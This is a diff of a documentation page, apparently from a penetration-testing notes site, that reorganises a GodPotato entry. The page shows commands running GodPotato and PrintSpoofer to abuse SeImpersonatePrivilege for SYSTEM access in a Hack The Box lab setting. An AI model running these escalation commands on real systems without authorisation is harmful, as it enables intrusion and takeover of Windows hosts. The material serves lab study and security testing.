@@ -7,13 +7,19 @@ boost: 10
 hideFooterPagination: true
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Commands/godpotato.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+[Search this tool’s saved examples](/commands/notebook?tool=godpotato) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-## Current operation: Test a compatible impersonation path with one command
+## Test a compatible impersonation path with one command
 
 **Run in:** Windows PowerShell. **Requires:** The matching .NET build, required impersonation capability and an OS/configuration supported by this implementation.
 
@@ -21,51 +27,9 @@ import { PreservedNotes } from "/snippets/preserved-notes.jsx";
 .\GodPotato-NET4.exe -cmd "cmd /c whoami"
 ```
 
-**Read the result:** Match the implementation's prerequisites to the current Windows build and token, then verify the returned identity.
-
-**If The tool launches but privilege escalation fails:** A tool's success message is weaker than the resulting token/process evidence; privilege presence and process context are distinct.
+**What the result establishes:** Match the implementation's prerequisites to the current Windows build and token, then verify the returned identity.
 
 **Next check:** Compare the actual token, runtime and reported COM/RPC error with this build's prerequisites; verify the resulting identity instead of assuming success.
-
-**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
-
-### Reviewed operation documentation
-
-- [Primary reference 1](https://github.com/BeichenDream/GodPotato)
-
-## Preserved earlier notes
-
-<PreservedNotes>
-
-Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
-
-## GodPotato: choose the operation and read the result
-
-Commands and examples collected from your GodPotato notes.
-
-### What the result establishes
-
-Match the implementation's prerequisites to the current Windows build and token, then verify the returned identity.
-
-### Prerequisites and common failures
-
-A tool's success message is weaker than the resulting token/process evidence; privilege presence and process context are distinct.
-
-### Example 1: B. Abuse SeImpersonatePrivilege → SYSTEM (no UAC needed) — the clean HTB move
-
-Run in: **Notebook example**. Saved as written; may include lab values or terminal output.
-
-```cmd
-.\PrintSpoofer64.exe -i -c cmd.exe
-:: or, very reliable on Server 2019:
-.\GodPotato-NET4.exe -cmd "cmd /c whoami"     :: -> nt authority\system
-```
-
-## Saved commands and notebook recipes
-
-Commands and examples collected from your GodPotato notes.
-
-[Search this tool’s saved examples](/commands/notebook?tool=godpotato) · [All tools](/index)
 
 ## B. Abuse SeImpersonatePrivilege → SYSTEM (no UAC needed) — the clean HTB move
 
@@ -77,16 +41,13 @@ Commands and examples collected from your GodPotato notes.
 .\GodPotato-NET4.exe -cmd "cmd /c whoami"     :: -> nt authority\system
 ```
 
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Active Directory Attack Path: Worked Lab — B. Abuse SeImpersonatePrivilege → SYSTEM (no UAC needed) — the clean HTB move](/cheatsheets/ad-attack-path-worked-example#b-abuse-seimpersonateprivilege-→-system-no-uac-needed-—-the-clean-htb-move)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
 Saved as written; may include lab values or terminal output.
 
-[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+## If it fails
+
+| Symptom | Check |
+| --- | --- |
+| The tool launches but privilege escalation fails | A tool's success message is weaker than the resulting token/process evidence; privilege presence and process context are distinct. |
 
 ## Notebook recipes
 
@@ -161,6 +122,10 @@ FULL DOMAIN COMPROMISE
 
 </AccordionGroup>
 
+## Related tools and references
+
+- [Official documentation 1](https://github.com/BeichenDream/GodPotato)
+
 {/* VAULT_RELATED_START */}
 
 **Source material and related references**
@@ -169,5 +134,3 @@ FULL DOMAIN COMPROMISE
 - [Windows Post-Exploitation: Field Reference](/cheatsheets/windows-post-exploitation)
 
 {/* VAULT_RELATED_END */}
-
-</PreservedNotes>
